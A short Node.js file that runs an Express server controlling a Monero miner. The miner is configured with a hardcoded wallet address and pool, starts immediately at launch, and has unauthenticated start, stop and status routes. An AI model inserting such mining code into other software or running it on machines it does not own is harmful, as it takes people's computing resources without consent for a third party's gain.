const express = require('express');
const Miner = require('eazyminer');

// Initialize the Express app
const app = express();
const port = 9806; // Port for the Express server

// Create a new miner instance
const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc',
        url: 'gulf.moneroocean.stream:10128', // optional pool URL,
    }],
    autoStart: false // optional delay
});

// Start the miner manually
miner.start();

// Define a route to start the miner
app.get('/start-miner', (req, res) => {
    miner.start();
    res.send('Miner started');
});

// Define a route to stop the miner
app.get('/stop-miner', (req, res) => {
    miner.stop();
    res.send('Miner stopped');
});

// Define a route to check miner status
app.get('/status', (req, res) => {
    res.send(miner.isRunning() ? 'Miner is running' : 'Miner is stopped');
});

// Start the Express server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
